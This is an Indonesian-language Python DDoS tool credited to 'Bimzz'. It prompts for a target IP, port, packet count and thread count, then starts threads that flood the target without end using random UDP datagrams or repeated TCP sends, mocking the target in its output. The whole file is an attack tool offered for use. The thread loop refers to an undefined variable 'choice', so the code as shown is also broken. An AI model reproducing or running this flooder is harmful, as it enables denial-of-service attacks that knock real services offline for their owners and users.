# RECODE ANAK HARAM + JADI YATIM + MISKIN !!
# CODE BY BIMZZ

#IMPORT
import sys
import os
import random
import time
import socket
import threading

#UBAH AUTHOR YATIM
print("------------------------------------------------")
print("[+] Tools DDoS BETA VERSION By Bimzz")
print("[+] Discord : KyBimzZ  び#1716")
print("[+] YouTube : Bimzz")
print("[+] Author  : Bimzz x KyTeam")
print("[+] KyTeam  : https://discord.gg/YMT9utYW5U")
print("------------------------------------------------")

ip = str(input("[Bimzz] IP TARGET : "))
port = int(input("[Bimzz] PORT TARGET : "))
times = int(input("[Bimzz] PACKETS : "))
threads = int(input("[Bimzz] THREADS : "))

os.system("clear")
print("[Bimzz] => [Wait 3s] => [Loading 3 Detik]")
time.sleep(3)
def run():
	data = random._urandom(1490)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attacking By Bimzz To IP => ",ip," PORT : ",port," !")
		except:
			print("[!] Down Yah? Awokswoksawoks Cuakzz.. ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Attacking By Bimzz To IP => ",ip," PORT : ",port," !")
		except:
			s.close()
			print("[*] Down Yah? Awokswoksawoks Cuakzz.. ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
